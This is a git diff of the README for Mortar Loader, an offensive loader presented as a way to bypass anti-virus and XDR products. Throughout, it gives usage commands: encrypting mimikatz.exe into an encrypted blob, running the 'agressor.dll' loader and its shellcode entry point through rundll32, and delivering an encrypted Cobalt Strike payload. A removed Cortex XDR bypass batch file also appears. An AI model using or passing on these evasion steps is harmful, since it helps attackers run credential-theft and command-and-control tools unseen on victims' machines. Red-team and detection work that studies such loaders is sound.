@@ -15,6 +15,8 @@ Mortar is able to bypass modern anti-virus products and advanced XDR solutions a
 
 detailed research and techniques : https://0xsp.com/security%20research%20&%20development%20(SRD)/defeat-the-castle-bypass-av-advanced-xdr-solutions
 
+Mortar Loader v2 features : https://0xsp.com/offensive/mortar-loader-v2/
+
 CrestCon Asia 2021 talk : https://www.youtube.com/watch?v=H7EMBz7GLMk
 
 # Usage 
@@ -27,17 +29,18 @@ root@kali>./encryptor -f mimikatz.exe -o bin.enc
 ```
 
 ## Loader (DLL)
-for bypassing Cortex XDR,add agressor.dll with bin.enc in the same folder and script the following bat file 
-```
-@echo off 
-cmd.exe /c rundll32.exe agressor.dll,stealth
-```
-for normal usage you can directly execute the agressor.dll 
+
+directly execute the agressor.dll using rundll32 or any DLL injection technique you prefer 
 
 ```
-rundll32.exe agressor.dll,dec
+rundll32.exe agressor.dll,start
 ```
-## Loader (EXE)
+
+for shellcode running 
+```
+rundll32 agressor.dll,sh
+```
+## Loader (EXE) ( HAS BEEN REMOVED IN V2)
 the executable version has more options you can use, as you able to pass commands for the loaded binary
 
 ```
@@ -49,7 +52,7 @@ deliver.exe -d -f cobalt.enc
 
 ```
 # Compiling the Loader (windows only)
-the project has been coded using FPC(Free Pascal), the compiling procedures are straightforward by downloading and installing Lazarus IDE (https://www.lazarus-ide.org/index.php?page=downloads) and navigate into file > open  -> Run -> build 
+the project has been coded using FPC(Free Pascal), the compiling procedures are straightforward by downloading and installing Lazarus IDE (https://www.lazarus-ide.org/index.php?page=downloads).
 
 
 # Compiling Encryptor(Linux/BSD/Arm/MacOS//windows)
